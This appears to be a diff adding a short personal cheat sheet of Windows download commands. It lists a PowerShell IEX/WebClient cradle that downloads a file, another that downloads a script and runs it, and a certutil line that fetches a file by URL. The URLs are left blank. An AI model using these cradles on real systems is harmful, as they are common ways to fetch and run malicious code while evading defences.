@@ -1,0 +1,7 @@
+download files 
+to download file without run it :IEX(new-object net.webclient).downloadfile('','name of saved file')
+to download file and run it : IEX(new-object net.webclient).downloadstring('')
+to download files use certutil -urlcache -split -f url dest 
+
+
+
